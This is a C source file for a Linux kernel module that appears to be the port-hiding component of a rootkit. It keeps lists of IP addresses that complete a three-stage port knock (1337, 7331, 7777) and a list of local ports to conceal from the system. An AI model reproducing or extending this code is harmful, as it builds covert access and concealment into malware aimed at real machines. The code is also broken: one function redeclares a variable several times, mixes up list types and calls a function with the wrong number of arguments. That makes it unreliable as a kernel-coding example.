#include <linux/kernel.h>
#include <linux/kprobes.h>
#include <linux/skbuff.h>
#include <linux/netdevice.h>
#include <linux/inet.h>
#include <uapi/linux/if_packet.h>
#include <uapi/linux/ip.h>
#include <uapi/linux/ipv6.h>
#include <linux/ip.h>
#include <linux/in.h>
#include <linux/ipv6.h>

#include "common.h"
#include "hook.h"
#include "porthide.h"

// knock stage 1: 1337
knock_list_t ips_stage1 = {
    .ip  = { 0 },
    .version = -1,
    .prev = NULL,
    .next = NULL,
};

knock_list_t_ptr ips_stage1_tail = &ips_stage1;

// knock stage 2: 7331
knock_list_t ips_stage2 = {
    .ip  = { 0 },
    .version = -1,
    .prev = NULL,
    .next = NULL,
};

knock_list_t_ptr ips_stage2_tail = &ips_stage2;

// knock stage 3: 7777
knock_list_t ips_stage3 = {
    .ip  = { 0 },
    .version = -1,
    .prev = NULL,
    .next = NULL,
};

knock_list_t_ptr ips_stage3_tail = &ips_stage3;

lport_list_t hidden_lports = {
    .lport = -1,
    .prev = NULL,
    .next = NULL,
};

lport_list_t_ptr hidden_lports_tail = &hidden_lports;

void
hide_lport(lport_t lport)
{
    if (!list_contains_lport(&hidden_lports, lport))
        add_lport_to_list(hidden_lports_tail, lport);
}

void
unhide_lport(lport_t lport)
{
    remove_lport_from_list(hidden_lports_tail, lport);
}

bool
stage1_knock(lport_t port)
{
    return port == 1337;
}

bool
stage2_knock(lport_t port)
{
    return port == 7331;
}

bool
stage3_knock(lport_t port)
{
    return port == 7777;
}

void
clear_hidden_lports(void)
{
    lport_list_t_ptr i = ips_stage1_tail;
    while ((i = remove_knock_from_list(i, i->lport)));

    lport_list_t_ptr i = ips_stage2_tail;
    while ((i = remove_knock_from_list(i, i->lport)));

    lport_list_t_ptr i = ips_stage3_tail;
    while ((i = remove_knock_from_list(i, i->lport)));

    lport_list_t_ptr i = hidden_lports_tail;
    while ((i = remove_lport_from_list(i, i->lport)));
}

bool
list_contains_lport(lport_list_t_ptr list, lport_t lport)
{
    return !!find_lport_in_list(list, lport);
}

lport_list_t_ptr
find_lport_in_list(lport_list_t_ptr head, lport_t lport)
{
    lport_list_t_ptr i;
    for (i = head; i; i = i->next)
        if (i->lport == lport)
            return i;

    return NULL;
}

lport_list_t_ptr
add_lport_to_list(lport_list_t_ptr tail, lport_t lport)
{
    lport_list_t_ptr node;
    node = (lport_list_t_ptr)kmalloc(sizeof(lport_list_t), GFP_KERNEL);

    if (node) {
        node->lport = lport;
        node->next = NULL;
        node->prev = tail;
        tail->next = node;
        hidden_lports_tail = node;
        return node;
    }

    return NULL;
}

lport_list_t_ptr
remove_lport_from_list(lport_list_t_ptr list, lport_t lport)
{
    lport_list_t_ptr i = find_lport_in_list(list, lport), ret = NULL;

    if (i && (i->lport != -1)) {
        if (i->next)
            i->next->prev = i->prev;
        else
            hidden_lports_tail = i->prev ? i->prev : &hidden_lports;

        if (i->prev) {
            i->prev->next = i->next;
            ret = i->prev;
        }

        kfree(i);
    }

    return ret;
}

bool
list_contains_knock(knock_list_t_ptr list, ip_t ip, ip_version version)
{
    return !!find_knock_in_list(list, ip, version);
}

knock_list_t_ptr
find_knock_in_list(knock_list_t_ptr head, ip_t ip, ip_version version)
{
    knock_list_t_ptr i;
    for (i = head; i; i = i->next)
        if (!memcmp(i->ip, ip, (version == v4 ? 4 : 16)) && (version == -1 || i->version == version))
            return i;

    return NULL;
}

knock_list_t_ptr
add_knock_to_list(knock_list_t_ptr *tail, ip_t ip, ip_version version)
{
    knock_list_t_ptr node;
    node = (knock_list_t_ptr)kmalloc(sizeof(knock_list_t), GFP_KERNEL);

    if (node) {
        memcpy(node->ip, ip, (version == v4 ? 4 : 16));
        node->version = version;
        node->next = NULL;
        node->prev = *tail;
        (*tail)->next = node;
        *tail = node;
        return node;
    }

    return NULL;
}

knock_list_t_ptr
remove_knock_from_list(knock_list_t_ptr list, knock_list_t_ptr *tail, ip_t ip, ip_version version)
{
    knock_list_t_ptr i = find_knock_in_list(list, ip, version), ret = NULL;

    if (i && (!memcmp(i->ip, ip, (version == v4 ? 4 : 16)) && i->version != -1)) {
        if (i->next)
            i->next->prev = i->prev;
        else
            *tail = i->prev ? i->prev : list;

        if (i->prev) {
            i->prev->next = i->next;
            ret = i->prev;
        }

        kfree(i);
    }

    return ret;
}
